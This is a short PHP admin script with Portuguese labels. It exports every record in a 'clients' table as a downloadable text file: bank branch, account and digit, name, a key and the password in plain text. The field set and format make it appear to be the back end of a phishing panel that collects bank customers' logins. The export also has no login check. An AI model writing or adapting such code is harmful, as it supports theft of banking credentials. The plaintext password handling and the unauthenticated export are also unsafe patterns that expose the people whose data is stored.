<?php
session_name('ADMINSESS');
session_set_cookie_params([
  'lifetime' => 604800,     // 7 dias
  'path' => '/admin',       // <-- IMPORTANTE: só visível nas rotas /admin
  'secure' => true,
  'httponly' => true,
  'samesite' => 'Lax'
]);
session_start();

require __DIR__ . '/../../includes/db.php';

header('Content-Type: text/plain');
header('Content-Disposition: attachment; filename="clients.txt"');

$rows = $pdo
    ->query("SELECT * FROM clients ORDER BY created_at DESC")
    ->fetchAll(PDO::FETCH_ASSOC);

foreach ($rows as $row) {
    echo "ID: {$row['id']}\n";
    echo "Cliente_ID: {$row['cliente_id']}\n";
    echo "Agência: {$row['agencia']}\n";
    echo "Conta-Dígito: {$row['conta']}-{$row['digito']}\n";
    echo "Nome: {$row['nome']}\n";
    echo "Chave: {$row['chave']}\n";
    echo "Senha: {$row['senha']}\n";
    echo "Status: {$row['status']}\n";
    echo "Data: {$row['created_at']}\n";
    echo str_repeat('-', 40) . "\n";
}
exit;
